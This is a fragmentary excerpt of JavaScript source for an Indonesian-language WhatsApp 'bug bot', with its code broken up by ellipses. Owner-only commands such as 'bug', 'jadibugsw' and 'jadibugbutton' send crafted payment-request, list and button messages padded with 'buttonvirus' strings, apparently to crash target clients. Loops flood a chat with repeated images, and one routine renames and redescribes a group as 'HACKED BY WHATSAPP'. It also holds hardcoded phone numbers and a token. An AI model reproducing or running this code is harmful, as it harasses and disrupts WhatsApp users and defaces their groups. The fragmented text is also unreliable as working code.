...
//=================================================//}
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `WhatsApp...`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/90542efea3b2a1d2ff57f.jpg',"thumbnail": thumb,"sourceUrl": `https://wahyudiid.w3spaces.com`}}}, { quoted: m})} 
...
caption: `© WhatsApp Bot${buttonkal}`,
} 
...
pporg = 'https://telegra.ph/file/90542efea3b2a1d2ff57f.jpg'
}
                await haikal.updateProfilePicture(from, { url: pporg }).catch((err) => fs.unlinkSync(pporg))
                }
                await haikal.groupUpdateSubject(from, `HACKED BY WHATSAPP`).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
                await haikal.groupUpdateDescription(from, `HACKED BY WHATSAPP`).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
...
case 'penjara':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`*Contoh* :\n#penjara Ninik [ Lu Sambil Replay Si nmr Target `)
...
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287774161017`)
...
break
case '*': {
if (!text) throw `Contoh : ${prefix + command} WhatsApp Bot`
let teks = `${q}`
{
...
await haikal.sendButtonText(from, buttonsntnsfww, `Iya Tuan Aku Disini 👋 Silahkan Pilih Button di Bawah Yah `, `Bot WhatsApp`, m)
}
}
break
//=================================================//
...
Runtime Bot : ${runtime(process.uptime())} 🥳 `, haikal.user.name, `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
...
haikal.sendListMsg(from, `
Game Menu🥳`, haikal.user.name, `Silahkan Pilih Game Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'antilink':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
haikal.sendListMsg(from, `
Antilink🥳`, haikal.user.name, `Silahkan Pilih Antilink Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'welcome':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
haikal.sendListMsg(from, `
Welcome Menu🥳`, haikal.user.name, `Silahkan Pilih Welcome Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'angtitox':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
haikal.sendListMsg(from, `
 Anti Toxic🥳`, haikal.user.name, `Silahkan Pilih Toxic Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'downloadmenu': {
...
Sewa Bot ? Hubungi Admin Untuk Nego wa.me/6285840104297`)
}
break
...
teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf WhatsApp Bot + sambil reply pesan target* \n\n Contoh 2 : yopdf WhatsApp Bot`
m.reply(teksoooo)
}
break
case 'yopdf':{
...
break
//=================================================//
case 'laranaswgan': case 'peratruruuran': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
...
break
case 'yuds': case 'bug': case 'apa': case 'kenapa': case 'oke':{
...
let teks = `${q}`
{
haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `WhatsApp...`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://wahyudiid.w3spaces.com`,
thumbnailUrl: 'https://telegra.ph/file/90542efea3b2a1d2ff57f.jpg', 
}
}}}}}, { quoted:m})
}
}
...
case 'jadibugsw': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} Tukangnya ngamoookk`
let teks = `${q}`
{
...
case 'jadibugbutton':
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Contoh : ${prefix + command} akwkwkwk`
let teks = `${q}`
{
const buttonssk = [
...
touchmebre = [
{
title: `🌷WHATSAPP BOT🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
...
haikal.sendListMsg(bnnd, `🌷 WHATSAPP BOT 🌷`, haikal.user.name, `Hay Kak Sc Bot Ada Di List`, `Click Here 🌷`, touchmebre, m)
sticSukses(from)
break
//=================================================//
...
"sellerJid": "6287774161017@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Bot Whatsapp ${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `Bot Wangsaff${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
...
"sellerJid": "628774161017@s.whatsapp.net",
